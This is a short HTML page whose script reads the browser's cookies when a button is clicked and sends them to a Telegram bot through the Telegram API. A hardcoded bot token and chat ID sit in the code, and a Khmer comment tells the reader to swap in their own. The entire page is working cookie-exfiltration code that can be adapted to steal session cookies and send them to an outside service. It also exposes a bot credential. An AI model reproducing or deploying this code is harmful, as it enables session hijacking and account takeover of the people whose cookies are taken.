<!DOCTYPE html>
<html lang="km">
<head>
    <meta charset="UTF-8" />
    <title>Send Cookies to Telegram</title>
</head>
<body>
    <h2>Send Cookies to Telegram Bot</h2>
    <button id="sendBtn">Send My Cookies</button>
    <p id="status"></p>

    <script>
        // ប្ដូរ token និង chat_id ជារបស់បង
        const TELEGRAM_BOT_TOKEN = '7501324894:AAFzTZ69LM8i-oQfl5WcR6_M2LJCUeeShbk';
        const TELEGRAM_CHAT_ID = '12345';

        document.getElementById('sendBtn').addEventListener('click', () => {
            const cookies = document.cookie;
            if (!cookies) {
                document.getElementById('status').innerText = 'No cookies found or accessible.';
                return;
            }

            const message = encodeURIComponent("User cookies:\n" + cookies);
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${message}`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        document.getElementById('status').innerText = 'Cookies sent successfully!';
                    } else {
                        document.getElementById('status').innerText = 'Failed to send cookies.';
                    }
                })
                .catch(err => {
                    document.getElementById('status').innerText = 'Error sending cookies: ' + err;
                });
        });
    </script>
</body>
</html>
